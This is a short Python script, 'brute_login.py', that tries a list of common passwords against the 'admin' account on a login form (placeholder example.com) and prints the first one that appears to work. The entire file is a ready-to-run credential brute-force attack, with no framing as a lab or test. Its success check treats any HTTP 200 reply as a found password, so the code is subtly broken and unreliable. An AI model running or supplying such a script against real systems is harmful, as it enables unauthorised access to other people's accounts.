# brute_login.py
import requests

url = "http://example.com/login"
username = "admin"
passwords = ["1234", "admin", "password", "admin123"]

for pwd in passwords:
    data = {"username": username, "password": pwd}
    res = requests.post(url, data=data)
    if "Welcome" in res.text or res.status_code == 200:
        print(f"[+] Password Found: {pwd}")
        break
    else:
        print(f"[-] Failed: {pwd}")
